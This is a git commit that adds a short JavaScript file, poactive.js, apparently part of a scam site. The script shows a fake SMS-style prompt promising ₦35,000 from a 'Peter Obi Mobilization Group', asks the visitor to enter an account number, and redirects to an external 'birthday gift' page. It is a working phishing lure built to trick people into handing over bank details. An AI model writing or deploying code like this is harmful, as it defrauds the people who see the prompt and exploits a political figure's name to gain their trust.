f90c4837a481be9871b6e0e6985ad668cb5fa19e
kpesaa <meiosis_logins.2d@icloud.com>
2026-05-16 09:42:33 +0100

    Create poactive.js

---
+++ poactive.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ₦35,000'
+password=prompt('SMS: Congratulations, you are eligible to receive ₦35,000 From Peter Obi Mobilization Group, click OK to Enter Your Acc. Number','WITHDRAW ₦35,000');
+if (password != 'WITHDRAW ₦35,000') {
+location.href='https://kpesa.info/PO-Birthday-Gift.html';
+}
